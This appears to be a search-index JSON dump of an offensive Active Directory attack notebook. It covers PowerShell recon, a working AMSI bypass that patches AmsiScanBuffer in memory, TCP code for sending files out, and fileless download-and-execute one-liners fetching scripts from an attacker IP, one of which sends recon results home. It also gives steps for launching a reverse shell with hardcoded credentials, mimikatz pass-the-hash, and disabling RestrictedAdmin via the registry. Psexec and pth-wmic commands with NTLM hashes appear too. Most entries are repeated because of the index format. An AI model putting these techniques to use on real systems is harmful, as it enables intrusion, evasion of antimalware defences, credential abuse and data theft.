$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://dc=....\") $searcher.SearchScope = \"Subtree\" $searcher.Filter = \"<ldap filter>\" foreach($result in $results) { $item = $results.Properties }","title":"Raw LDAP queries"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#module","text":"Install active directory module and then Import-Module activedirectory","title":"Module"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#get-information-about-users","text":"Below command retrieves information about administrator Get-ADUser administrator All users Get-ADUser -filter \"*\"","title":"Get information about users"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#get-informaton-about-computers","text":"All computers Get-ADComputers -filter \"*\"","title":"Get informaton about computers"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#get-information-about-groups-for-a-user","text":"Below command retrieves all groups for the administrator account Get-ADPrincipalGroupMembership -Identity administrator","title":"Get information about groups for a user"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#get-information-abouts-access-control-lists-locally","text":"Get object information from local computer: Get-ACL Get Security Descriptor for \"C:\\Windows\" Get-Acl C:\\Windows Get Security Descrpitor for log files starting with k in windows folder Get-Acl -Path \"C:\\Windows\\k*.log\" Get Security Descriptor for Registry key Get-Acl -Path \"HKLM:\\System\\CurrentControlSet\\Control\" Get Security Descriptor for an object Get-Acl -InputObject (Get-StorageSubsystem -Name S087)","title":"Get information abouts Access Control Lists Locally"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#access-control-lists-in-an-ad","text":"Get object information from AD: (Spawns a new shell). Running comands in this new location retrieves ifnroamtion from AD (like Get-Acl) Import-Module activedirectory set-location ad: Get-ACL ... Otherwise you can use the distinguished name with the active directory drive mount point as prefix: Get-Acl \"AD:\\CN=qw...,DC=....\" Everything below is run after setting location to AD drive Get ACL information by using distinguished name Get-Acl \"OU=aaa,DC=somedomain,DC=tld\" Get-Acl (Get-ADOrganizationalUnit -filter \"Name -eq 'aaa'\") Creates a table of permissions for the Organizational Unit aaa, in domain somedomain.tld (Get-Acl (Get-ADOrganizationalUnit -filter \"Name -eq 'aaa'\")).Access | Format-Table IdentityReference, AccessControlType -AutoSize","title":"Access control lists in an AD"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#add-user-to-group","text":"Add-ADGroupMember <adgroup> <adprincipal> Add-ADGroupMember SomeGroup SomUser","title":"Add user to group"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#active-directory-drive","text":"When loading the AD module, it creates an AD drive. Set your working location to the AD drive (makes commands run in the AD context instead, like dir) Set-Location ad: Set your working location to a specific domain in the AD drive Set-Location \"dc=somedomain,dc=local\"","title":"Active Directory Drive"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#search-ad-objects-by-sid","text":"Get-ADObject -Filter \"objectSid -eq 'S-1-5-321-...'\"","title":"Search AD objects by SID"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#queriying-trusted-domains-ie-not-your-current-domain","text":"Get-ADUser -Server other.domain.tld \"username\"","title":"Queriying trusted domains (i.e. not your current domain)"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#get-acls-for-objects-in-trusted-domains","text":"New-PSDrive -Name AD2 -PSProvider ActiveDirectory -Server other.domain.tld -root \"//RootDSE/\" Get-ACL (\"AD2:\\\\\" + (Get-ADUser -Server other.domain.tld \"username\").DistinguishedName)","title":"Get ACLs for objects in trusted domains"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#combination","text":"Retreives all permissions on object for a user, and eveyr permission with only a SID, it performs a lookup to check what these SIDs are (Get-Acl \"AD:\\$((Get-ADUser vlad).DistinguishedName)\").Acess | Where-Object { $_.IdentityReference -like \"s-1-*\" } | Foreach { Get-ADObject -Filter \"objectSid -eq '$($_.IdentityReference)' }","title":"Combination"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#gpo-handling","text":"Retrieves all GPOs (Use -Domain to specify for a specific domain) Get-GPO -All Retreives all inherited GPOs for a domain or OU Get-GPInheritance -Target \"OU=aaa,DC=somedomain,DC=local\" -Domain somedomain.local Retrieves applied settings from a GPO named Test (Use -All for all GPOs) Get-GPOReport -Name Test -ReportType [XML|HTML] -Path C:\\GPOReports\\test.html Retreives all permissions for a GPO named Test Get-GPPermissions -Name Test -All Retreives the resultant set of policy applied to a user or computer, or both Get-GPResultantSetofPolicy -Path C:\\GPOReports\\sop.xml -ReportType XML [-Computer <>] [-User <>]","title":"GPO handling"},{"location":"attacking_active_directory_domain/powershell/amsi_bypass/","text":"Antimalware Scan Interface (AMSI) # Source: Antimalware Scan Interface (AMSI) When trying to invoke expression and load, for example, PowerView.ps1 directly from the internet in order to not leave stuff on the disk you'll most properly run in to being blocked due to AMSI. This can be bypassed by utilizing rasta-mouses amsi-bypass which patches the memory to allow execution of suspicious commands. Description AMSI # The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads. AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided by today's antimalware products that can be integrated into applications. It supports a calling structure allowing for file and memory or stream scanning, content source URL/IP reputation checks, and other techniques. AMSI also supports the notion of a session so that antimalware vendors can correlate different scan requests. For instance, the different fragments of a malicious payload can be associated to reach a more informed decision, which would be much harder to reach just by looking at those fragments in isolation Example # AMSI Bypass (rasta-mouse) # Source: AmsiScanBufferBypass $Win32 = @\" using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \"@ Add-Type $Win32 $LoadLibrary = [Win32]::LoadLibrary(\"am\" + \"si.dll\") $Address = [Win32]::GetProcAddress($LoadLibrary, \"Amsi\" + \"Scan\" + \"Buffer\") $p = 0 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)","title":"AMSI Bypass"},{"location":"attacking_active_directory_domain/powershell/amsi_bypass/#antimalware-scan-interface-amsi","text":"Source: Antimalware Scan Interface (AMSI) When trying to invoke expression and load, for example, PowerView.ps1 directly from the internet in order to not leave stuff on the disk you'll most properly run in to being blocked due to AMSI. This can be bypassed by utilizing rasta-mouses amsi-bypass which patches the memory to allow execution of suspicious commands.","title":"Antimalware Scan Interface (AMSI)"},{"location":"attacking_active_directory_domain/powershell/amsi_bypass/#description-amsi","text":"The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads. AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided by today's antimalware products that can be integrated into applications. It supports a calling structure allowing for file and memory or stream scanning, content source URL/IP reputation checks, and other techniques. AMSI also supports the notion of a session so that antimalware vendors can correlate different scan requests. For instance, the different fragments of a malicious payload can be associated to reach a more informed decision, which would be much harder to reach just by looking at those fragments in isolation","title":"Description AMSI"},{"location":"attacking_active_directory_domain/powershell/amsi_bypass/#example","text":"","title":"Example"},{"location":"attacking_active_directory_domain/powershell/amsi_bypass/#amsi-bypass-rasta-mouse","text":"Source: AmsiScanBufferBypass $Win32 = @\" using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \"@ Add-Type $Win32 $LoadLibrary = [Win32]::LoadLibrary(\"am\" + \"si.dll\") $Address = [Win32]::GetProcAddress($LoadLibrary, \"Amsi\" + \"Scan\" + \"Buffer\") $p = 0 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)","title":"AMSI Bypass (rasta-mouse)"},{"location":"attacking_active_directory_domain/powershell/basics_of_powershell/","text":"Select properties from a returned object # get-domaincomputer -unconstrained | select-object -property name,useraccountcontrol","title":"Basics of Powershell"},{"location":"attacking_active_directory_domain/powershell/basics_of_powershell/#select-properties-from-a-returned-object","text":"get-domaincomputer -unconstrained | select-object -property name,useraccountcontrol","title":"Select properties from a returned object"},{"location":"attacking_active_directory_domain/powershell/jit_csharp_compilation/","text":"Load native Windows API functions # Three ways to achieve this: 1) Use the Add-Type cmdlet to compile C# code 2) Get reference to private type in .NET framework that calls the method 3) Use reflection to dynamically define a method that calls the Windows API function Add-Type cmdlet # C# signatures can be retrieved from: http://www.pinvoke.net/ Note the \"public\" keyword, this is required to properly use the function from PowerShell $MethodDefinition = @' [DllImport(\"kernel32.dll\", CharSet = CharSet.Unicode)] public static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists); '@ $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru # You may now call the CopyFile function # Copy calc.exe to the user's desktop $Kernel32::CopyFile(\"$($Env:SystemRoot)\\System32\\calc.exe\", \"$($Env:USERPROFILE)\\Desktop\\calc.exe\", $False)","title":"JIT CSharp Compilation"},{"location":"attacking_active_directory_domain/powershell/jit_csharp_compilation/#load-native-windows-api-functions","text":"Three ways to achieve this: 1) Use the Add-Type cmdlet to compile C# code 2) Get reference to private type in .NET framework that calls the method 3) Use reflection to dynamically define a method that calls the Windows API function","title":"Load native Windows API functions"},{"location":"attacking_active_directory_domain/powershell/jit_csharp_compilation/#add-type-cmdlet","text":"C# signatures can be retrieved from: http://www.pinvoke.net/ Note the \"public\" keyword, this is required to properly use the function from PowerShell $MethodDefinition = @' [DllImport(\"kernel32.dll\", CharSet = CharSet.Unicode)] public static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists); '@ $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru # You may now call the CopyFile function # Copy calc.exe to the user's desktop $Kernel32::CopyFile(\"$($Env:SystemRoot)\\System32\\calc.exe\", \"$($Env:USERPROFILE)\\Desktop\\calc.exe\", $False)","title":"Add-Type cmdlet"},{"location":"attacking_active_directory_domain/powershell/local_machine_recon/","text":"Windows - Local recon # System information # systeminfo All hotfixes applied # Get-WmiObject -Class Win32_QuickFixEngineering -ComputerName . OS Information # Get-WmiObject -Class Win32_OperatingSystem -ComputerName . Logon Sessions # Get-WmiObject -Class Win32_LogonSession -ComputerName . Logged on users # Get-WmiObject -Class Win32_ComputerSystem -ComputerName . Services # Get-WmiObject -Class Win32_service -ComputerName . Get-WmiObject -Class Win32_service -ComputerName . | Where-Object { $_.State -eq \"Running\" } # Returns Name, service account, a description and the path to the executable Get-WmiObject -Class Win32_service -ComputerName . | Select Name,StartName,Description,PathName Local users, groups and memberships # Get-LocalUser Get-LocalGroup Get-LocalGroupMembership <groupname> Get listening services # netstat -a -n -o","title":"Local Machine Recon"},{"location":"attacking_active_directory_domain/powershell/local_machine_recon/#windows-local-recon","text":"","title":"Windows - Local recon"},{"location":"attacking_active_directory_domain/powershell/local_machine_recon/#system-information","text":"systeminfo","title":"System information"},{"location":"attacking_active_directory_domain/powershell/local_machine_recon/#all-hotfixes-applied","text":"Get-WmiObject -Class Win32_QuickFixEngineering -ComputerName .","title":"All hotfixes applied"},{"location":"attacking_active_directory_domain/powershell/local_machine_recon/#os-information","text":"Get-WmiObject -Class Win32_OperatingSystem -ComputerName .","title":"OS Information"},{"location":"attacking_active_directory_domain/powershell/local_machine_recon/#logon-sessions","text":"Get-WmiObject -Class Win32_LogonSession -ComputerName .","title":"Logon Sessions"},{"location":"attacking_active_directory_domain/powershell/local_machine_recon/#logged-on-users","text":"Get-WmiObject -Class Win32_ComputerSystem -ComputerName .","title":"Logged on users"},{"location":"attacking_active_directory_domain/powershell/local_machine_recon/#services","text":"Get-WmiObject -Class Win32_service -ComputerName . Get-WmiObject -Class Win32_service -ComputerName . | Where-Object { $_.State -eq \"Running\" } # Returns Name, service account, a description and the path to the executable Get-WmiObject -Class Win32_service -ComputerName . | Select Name,StartName,Description,PathName","title":"Services"},{"location":"attacking_active_directory_domain/powershell/local_machine_recon/#local-users-groups-and-memberships","text":"Get-LocalUser Get-LocalGroup Get-LocalGroupMembership <groupname>","title":"Local users, groups and memberships"},{"location":"attacking_active_directory_domain/powershell/local_machine_recon/#get-listening-services","text":"netstat -a -n -o","title":"Get listening services"},{"location":"attacking_active_directory_domain/powershell/networking/","text":"Networking with powershell # Connect TCP # $tcp = New-Object System.Net.Sockets.TcpClient(\"<ip>\", <port>) Send data # [Byte[]] $buffer = [Text.Encoding]::ASCII.GetBytes(\"<string>\") $tcp = New-Object System.Net.Sockets.TcpClient(\"<ip>\", <port>) $stream = $tcp.GetStream() $stream.Write($buffer, 0, $buffer.Length) Send file # $bytes = [System.IO.File]::ReadAllBytes(\"<filepath>\") $tcp = New-Object System.Net.Sockets.TcpClient(\"<ip>\", <port>) $stream = $tcp.GetStream() $stream.Write($bytes, 0, $bytes.Length)","title":"Networking"},{"location":"attacking_active_directory_domain/powershell/networking/#networking-with-powershell","text":"","title":"Networking with powershell"},{"location":"attacking_active_directory_domain/powershell/networking/#connect-tcp","text":"$tcp = New-Object System.Net.Sockets.TcpClient(\"<ip>\", <port>)","title":"Connect TCP"},{"location":"attacking_active_directory_domain/powershell/networking/#send-data","text":"[Byte[]] $buffer = [Text.Encoding]::ASCII.GetBytes(\"<string>\") $tcp = New-Object System.Net.Sockets.TcpClient(\"<ip>\", <port>) $stream = $tcp.GetStream() $stream.Write($buffer, 0, $buffer.Length)","title":"Send data"},{"location":"attacking_active_directory_domain/powershell/networking/#send-file","text":"$bytes = [System.IO.File]::ReadAllBytes(\"<filepath>\") $tcp = New-Object System.Net.Sockets.TcpClient(\"<ip>\", <port>) $stream = $tcp.GetStream() $stream.Write($bytes, 0, $bytes.Length)","title":"Send file"},{"location":"attacking_active_directory_domain/powershell/running_program_as_user_without_guiinteraction/","text":"Powershell - Start process as another user without GUI interactions # I have not been able to use \"runas\" command, as it requires some extra input (GUI-connected?) As certain users cannot use psexec (requires local admin access), it's simpler to upload a reverse shell and use \"start-process\" with the other user's credentials. $program = \"C:\\Share\\rev_shell.exe\" $usr_plain = \"domain1\\adm_user\" $pwd_plain = \"P@ssword\" $pwd_obj = ConvertTo-SecureString $pwd_plain -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential($usr_plain, $pwd_obj) Start-Process $program -Credential $creds","title":"Running Program as User Without GUI Interaction"},{"location":"attacking_active_directory_domain/powershell/running_program_as_user_without_guiinteraction/#powershell-start-process-as-another-user-without-gui-interactions","text":"I have not been able to use \"runas\" command, as it requires some extra input (GUI-connected?) As certain users cannot use psexec (requires local admin access), it's simpler to upload a reverse shell and use \"start-process\" with the other user's credentials. $program = \"C:\\Share\\rev_shell.exe\" $usr_plain = \"domain1\\adm_user\" $pwd_plain = \"P@ssword\" $pwd_obj = ConvertTo-SecureString $pwd_plain -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential($usr_plain, $pwd_obj) Start-Process $program -Credential $creds","title":"Powershell - Start process as another user without GUI interactions"},{"location":"attacking_active_directory_domain/recon/active_directory_recon/","text":"Using Active Directory Remote Server Administration Toolkit (RSAT) # Most client computers and even servers don't have RSAT installed. You usually need to be local admin to install RSAT. However, every DC comes with RSAT installed, and it is just a dll found here on the DC: C:\\Windows\\Microsoft.NET\\assembly\\GAC_64\\Microsoft.ActiveDirectory.Management\\XXX\\Microsoft.ActiveDirectory.Management.dll If you want you can just upload that dll to your computer, import it and then you have access to the RSAT commands. import-module Microsoft.ActiveDirectory.Management.dll get-addomain sha256sum Microsoft.ActiveDirectory.Management.dll 8eb311a48c6bb32577dac1844372513fbc66e0093351206fb17679ebd1272135 Microsoft.ActiveDirectory.Management.dll If you don't want to write anything to disk you can import the entire module straight into memory with the script found here . The script uses [System.Reflection.Assembly]::Load($bytes) which sometimes triggers WinDefender to check the files. iex (New-Object Net.WebClient).DownloadString(\"http://192.168.77.90/rsat.ps1\") get-aduser -filter * The RSAT module can be loaded and an additional recon-script can be executed, that send home the result of the recon, all can be done without touching disk. There are two ways to execute both, or several, command in oneline: '(New-Object Net.WebClient).DownloadString(\"http://192.168.77.90/rsat.ps1\")', 'get-recon -ip 192.168.77.90 -port 9999' | invoke-expression invoke-command -scriptblock {(New-Object Net.WebClient).DownloadString(\"http://192.168.77.90/rsat.ps1\"); get-recon -ip 192.168.77.90 -port 9999} Check to which domain the computer is connected # systeminfo Get all Organizational Units (OUs) # ldapsearch -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(objectClass=organizationalUnit)\" Find domain-controllers # Method 1 # Open cmd.exe and run: set logonserver Check for \"Logon server\" systeminfo Method 2 # Open cmd.exe and run: echo %logonserver% Method 3 # To find all DC in a domain open CMD/PowerShell and run: nltest.exe /dclist:<domain> Find Password Complexity Requirements # Knowledge of the password complexity requirements is useful if you want to perform brute force password cracking attacks, or create password lists that comply with the domains password complexity requirements. GPO # What complicates things even more is that Password Policy can also be set in GPO, but NOT through GPOs that are linked to a OU. THe Password Policy GPO must be linked to the domain in order to take effect. And you can also set multiple password policies to one user/group, but with different precedence. All and all, it is hard to know which password policy a specific user must adhere to. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770394(v=ws.10)?redirectedfrom=MSDN Fine grained password policies (FGPP) # Since 2008 it has been possible to create find-grained password requirements, for a specific user or for a group. If you go to ADUC / System / Password Settings Policy you can create a password policy. This policy can then be assigned to either users or groups. This means that a group or user can have different password policies.","title":"Reconnaissance"},{"location":"attacking_active_directory_domain/recon/active_directory_recon/#using-active-directory-remote-server-administration-toolkit-rsat","text":"Most client computers and even servers don't have RSAT installed. You usually need to be local admin to install RSAT. However, every DC comes with RSAT installed, and it is just a dll found here on the DC: C:\\Windows\\Microsoft.NET\\assembly\\GAC_64\\Microsoft.ActiveDirectory.Management\\XXX\\Microsoft.ActiveDirectory.Management.dll If you want you can just upload that dll to your computer, import it and then you have access to the RSAT commands. import-module Microsoft.ActiveDirectory.Management.dll get-addomain sha256sum Microsoft.ActiveDirectory.Management.dll 8eb311a48c6bb32577dac1844372513fbc66e0093351206fb17679ebd1272135 Microsoft.ActiveDirectory.Management.dll If you don't want to write anything to disk you can import the entire module straight into memory with the script found here . The script uses [System.Reflection.Assembly]::Load($bytes) which sometimes triggers WinDefender to check the files. iex (New-Object Net.WebClient).DownloadString(\"http://192.168.77.90/rsat.ps1\") get-aduser -filter * The RSAT module can be loaded and an additional recon-script can be executed, that send home the result of the recon, all can be done without touching disk. There are two ways to execute both, or several, command in oneline: '(New-Object Net.WebClient).DownloadString(\"http://192.168.77.90/rsat.ps1\")', 'get-recon -ip 192.168.77.90 -port 9999' | invoke-expression invoke-command -scriptblock {(New-Object Net.WebClient).DownloadString(\"http://192.168.77.90/rsat.ps1\"); get-recon -ip 192.168.77.90 -port 9999}","title":"Using Active Directory Remote Server Administration Toolkit (RSAT)"},{"location":"attacking_active_directory_domain/recon/active_directory_recon/#check-to-which-domain-the-computer-is-connected","text":"systeminfo","title":"Check to which domain the computer is connected"},{"location":"attacking_active_directory_domain/recon/active_directory_recon/#get-all-organizational-units-ous","text":"ldapsearch -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(objectClass=organizationalUnit)\"","title":"Get all Organizational Units (OUs)"},{"location":"attacking_active_directory_domain/recon/active_directory_recon/#find-domain-controllers","text":"","title":"Find domain-controllers"},{"location":"attacking_active_directory_domain/recon/active_directory_recon/#method-1","text":"Open cmd.exe and run: set logonserver Check for \"Logon server\" systeminfo","title":"Method 1"},{"location":"attacking_active_directory_domain/recon/active_directory_recon/#method-2","text":"Open cmd.exe and run: echo %logonserver%","title":"Method 2"},{"location":"attacking_active_directory_domain/recon/active_directory_recon/#method-3","text":"To find all DC in a domain open CMD/PowerShell and run: nltest.exe /dclist:<domain>","title":"Method 3"},{"location":"attacking_active_directory_domain/recon/active_directory_recon/#find-password-complexity-requirements","text":"Knowledge of the password complexity requirements is useful if you want to perform brute force password cracking attacks, or create password lists that comply with the domains password complexity requirements.","title":"Find Password Complexity Requirements"},{"location":"attacking_active_directory_domain/recon/active_directory_recon/#gpo","text":"What complicates things even more is that Password Policy can also be set in GPO, but NOT through GPOs that are linked to a OU. THe Password Policy GPO must be linked to the domain in order to take effect. And you can also set multiple password policies to one user/group, but with different precedence. All and all, it is hard to know which password policy a specific user must adhere to. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770394(v=ws.10)?redirectedfrom=MSDN","title":"GPO"},{"location":"attacking_active_directory_domain/recon/active_directory_recon/#fine-grained-password-policies-fgpp","text":"Since 2008 it has been possible to create find-grained password requirements, for a specific user or for a group. If you go to ADUC / System / Password Settings Policy you can create a password policy. This policy can then be assigned to either users or groups. This means that a group or user can have different password policies.","title":"Fine grained password policies (FGPP)"},{"location":"attacking_active_directory_domain/remote_access/remote_access/","text":"Remote access # There are multiple ways to access machines remotely. Remote Desktop Protocol (RDP) # Port: 3389/TCP Tools: rdesktop, xfreerdp Implementations # rdesktop -g 80% 192.168.112.200 sudo aptitude install freerdp2-x11 xfreerdp /u:username /d:nameofdomain.local /p:[thehash] /v:10.1.1.1 sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:\"mstsc.exe /restrictedadmin\" Why is it not working? # The user you are using must belong to the domain group Remote Desktop Users , or allow the user to to RDP to a specific host. If you want to RDP to a host that you already control (for example if you want to RDP to your physical computer that your client has provided) and you do not belong to the domain group Remote Desktop Users you can allow your domain user to RDP to your computer by doing the following: Go to: system properties / advanced Fj\u00e4rrsessioner V\u00e4lj anv\u00e4ndare (Select your user) Unclick \"Till\u00e5t bara bara anslutningar som anv\u00e4nder ...\" It might be that the computer you are trying to access Restricted Admin mode disabled. This means that you can't use PTH to RDP to it. But if you have a shell you can just enable it, like this: First you create a new shell as the user you are impersonating. mimikatz.exe \"sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe\" After that you just create a new powershell session on your target machine, and then you disable the restriction, like the follwing: Enter-PSSession -Computer <Target> New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name \"DisableRestrictedAdmin\" -Value \"0\" -PropertyType DWORD -Force Server Message Block (SMB) # Port: 445/TCP, 135/TCP, High Random Port Tools: Impacket, Metasploit, SysInternals, There are various tools that leverage the SMB protocol together with RPC to remotely interact with a computer, the most famous is PsExec included in SysInternals . In order to use the technique the user must either be a domain user with local administrator permission, or be the local user Administrator . The best tool to use is PsExec.py by Impacket, for e few reasons: it can speak SMBv2, it is not caught by Windows Defender, it can be used by pass the hash. Most implementations work like this: 1. It mounts the share admin$ . 2. Adds an executable there. 3. Creates a new service using Service Control Manager (SCM) , and link that to the executable. 4. Starts the service. Implementations # There are many implementations of this technique. Impacket psexec.py hackdomain/pelle@192.168.66.88 psexec.py Administrator@192.168.66.88 psexec.py -hashes 00000000000000000000000000000000:88e4d9fabaecf3dec18dd80905521b29 user@192.168.66.88 smbexec.py evilcorp.local/philip@192.168.77.12 Metasploit PsExec_psh The metasploti-module exploit/windows/smb/psexec_psh creates a service, but instead of uploading an executable to disk the service is started with a powershell command, something like this: powershell.exe IEX (new-object Net.WebClient).DownloadString(\"http://...script.ps1\"); invoke-thescript Metasploit psexec Otherwise you can also use metasploit exploit windows/smb/psexec but it can't hand \u00c5\u00c4\u00d6. SysInternals / PsExec.exe psexec.exe \\\\192.11.11.11 -u Administrat\u00f6r cmd.exe WinEXE / PTH-WinEXE winexe is a linux-port of Sysinternals PsExec. pth-winexe just adds the pass-the-hash function. Can be accessed from kali repo with: sudo apt-get install passing-the-hash winexe --uninstall --user evilcorp.local/philip //192.168.77.12 \"cmd.exe\" pth-winexe --uninstall--user evilcorp.local/philip //192.168.77.12 \"cmd.exe\" # To escalate to system winexe --uninstall --system --user evilcorp.local/philip //192.168.77.12 \"cmd.exe\" pth-winexe --uninstall --system --user evilcorp.local/philip //192.168.77.12 \"cmd.exe\" Why is it not working? # Access Denied If you try to use PsExec , but when you do you get the response Access Denied , the most likely scenario is that the following registry key is set: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy This blocks local admin users with the User Account Control (UAC) security mechanism. Share is not writable If you try to authenticate using a local account that belongs to the Administrators group you might get the error below. This is because a non-default local administrator account can't write to ADMIN$ . [-] share 'ADMIN$' is not writable. [-] share 'C$' is not writable. SMBv1 is disabled If you use winexe against a windows 10 machine, you might get this error ERROR: Failed to open connection - NT_STATUS_CONNECTION_RESET . This is most likely because winexe is using SMBv1, which is disabled by default on Windows 10. Anti-virus It might be that the payload gets caught by anti-virus. Metasploits exploit/windows/smb/psexec_psh , and exploit/windows/smb/psexec both get caught by windows-defender, for example. Not a true admin account Local admin accounts (that are not the builtin Administrator accounts) can't use PSEXEC because since Windows patched that. But the default 500 Administrator always can. WinRM / Windows Remote Managements # Port: 5985/TCP/HTTP, 5986/TCP/HTTPS Tools: WinRM, Enter-PSSession, Invoke-Command First let's try to understand the common terminology. WinRM: Windows Remote Management, is Microsoft\u2019s implementation of the WS-Management protocol WS-Management: Web Services-Management, is an open standard that is based on SOAP messages to remotely exchange messaging data WinRS: Windows Remote Shell is a function of WinRM and is used to create a shell remotely on a Windows host and execute commands. This is usually what most open source libraries that claim WinRM support work with PSRP: PowerShell Remoting Protocol is a separate protocol that runs over WinRM, this is the protocol that is used when executing a command with Invoke-Command or Enter-PSSession and has some differences with WinRS Implementations # The following are some tools that use WinRM. PowerShell PSRemoting New-PSSession -ComputerName <computername> -Credential (Get-Credential) Enter-PSSession <host> -Credential <domain>\\<user> Invoke-Command <host> -Credential $cred -ScriptBlock {Hostname} # Upload file to remote session Copy-Item -Path C:\\Temp\\PowerView.ps1 -Destination C:\\Temp\\ -ToSession (Get-PSSession) # Download file from remote session Copy-Item -Path C:\\Users\\Administrator\\Desktop\\test.txt -Destination C:\\Temp\\ -FromSession (Get-PSSession) $SecPassword = ConvertTo-SecureString 'supersecretpassword' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('domain\\dfm.a', $SecPassword) Connect-WSMan -Credential $Cred -ComputerName targetmachine Why is it not working? # No WinRM server is running If you have access to the computer you can enable WinRM. This is probably not something you want to do. Because by default I think it will go over HTTP, and you will not want to authenticate over HTTP. But FYI this is how it is done: winrm quickconfig Enable-PSRemoting WMI / Windows Management Instruments / WMIC # WMI: Windows Management Instruments WMIC: Windows Management Instruments Command-line Ports: 135 (Default. DCOM) Port: 5986 (if WinRM is used) WMI can be used locally. But from an attackers perspective is how we can use it remotley, over the network. When used over the network two protocols are used: WinRM and DCOM. WMI is based on a client-server model. There are many different clients, the following are some native windows clients: wmic.exe PowerShell (A number of cmdlets can be used) VBScript JScript wbemtest.exe C/C++ via COM winrm.exe winrs.exe The server is: WMIService (WINmgmt) DCOM: Distributed Component Object Model, has been the default protocol used by WMI. It runs on port 135, subsequent data is transfered over randomly selected tcp port. All the windows built-in cmdlets and methods use DCOM as the default protocol. WinRM: WinRM has superseded DCOM as the default protocol for remote WMI communication. There are usually two methods to achieve code execution with WMI, those are: Win32_Process Create method and event consumers. So what most hacking tools for lateral movement do is to create a new process and create cmd for example. Implementations # Impacket # wmiexec pth-wmis # sudo apt-get install passing-the-hash pth-wmis root@Kali:~# pth-wmic -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 \"select Name from Win32_UserAccount\" root@Kali:~# pth-wims -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 \"cmd.exe /c whoami > c:\\temp\\result.txt\" root@Kali:~# pth-smbclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25/c$ root@Kali:~# pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 Powershell Empire # Invoke_wmi WMIC # Spawning a new process on the target system 10.0.0.6 from another compromised system 10.0.0.2: wmic /node:10.0.0.6 /user:administrator process call create \"cmd.exe /c calc\" Why is it not working? # Check the port Is port 135 open on the target?","title":"Remote Access"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#remote-access","text":"There are multiple ways to access machines remotely.","title":"Remote access"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#remote-desktop-protocol-rdp","text":"Port: 3389/TCP Tools: rdesktop, xfreerdp","title":"Remote Desktop Protocol (RDP)"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#implementations","text":"rdesktop -g 80% 192.168.112.200 sudo aptitude install freerdp2-x11 xfreerdp /u:username /d:nameofdomain.local /p:[thehash] /v:10.1.1.1 sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> 